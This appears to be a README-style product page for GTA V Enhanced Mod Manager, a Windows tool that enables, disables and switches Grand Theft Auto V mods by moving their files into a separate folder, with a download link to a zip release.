# GTA V Enhanced Mod Manager (MME) – Enable, Disable, and Switch GTA V Mods

GTA V Enhanced Mod Manager (MME) is a Windows mod management tool designed for Grand Theft Auto V Enhanced. It allows you to enable and disable installed mods, save custom mod profiles, and launch GTA V with a clean installation, selected modifications, or all managed mods. Instead of manually moving mod files every time you want to change your setup, MME handles the switching for you by moving disabled files into a dedicated folder. It is a straightforward solution for players who want more control over their GTA V Enhanced mod setup.

> **[Download GTA V Enhanced Mod Manager from GitHub Releases](https://github.com/GTA-V-Mod-Manager-Enhanced-MME/.github/releases/download/v.1.0.1/GTA.V.Mod.Manager.Enhanced.v1.0.1.zip)**

![GTA 5 Enhanced Mod Manager Settings)](https://github.com/GTA-V-Mod-Manager-Enhanced-MME/.github/blob/main/assets/image/GTA%20V%20Mod%20Manager%20Enhanced.png?raw=true)

## Why Use GTA V Enhanced Mod Manager?

GTA V Enhanced Mod Manager (MME) is a practical tool for modders who regularly switch between different mod configurations. Instead of manually deleting, moving, and restoring files every time you need a clean game installation, MME lets you enable or disable managed mods from one interface.

For developers working with scripts, plugins, and other game modifications, this makes it easier to prepare different mod setups, check changes in a clean environment, and return to a previously selected configuration without rebuilding the entire mod folder.

## ScriptHookV Version Check and Game Protection

GTA V updates can affect the compatibility of installed modifications and their dependencies. MME includes a ScriptHookV version check that compares the installed `ScriptHookV.dll` version with the game executable.

If the installed ScriptHookV version appears older than the game version, the manager displays a warning so you can check your installation before launching the game.

MME also includes a game-running protection mechanism. It refuses to move managed mod files while GTA V is running, helping prevent file operations during an active game session.

## Enable and Disable GTA V Enhanced Mods Easily

GTA V Enhanced Mod Manager scans your game directory and identifies files and folders associated with modifications. Instead of permanently deleting disabled mods, MME moves their files into a dedicated `Disabled mods` folder inside your GTA V installation.

When you want to use a modification again, you can enable it and move its files back into the active game directory.

The manager recognises common mod-related components, including `.asi` files, `dinput8.dll`, `ScriptHookV.dll`, `scripts/`, and `mods/`. Loose `.rpf` archives in the game root are left untouched.

This approach is useful when you want to temporarily disable GTA V mods, switch configurations, or return to a clean game setup without manually moving files yourself.
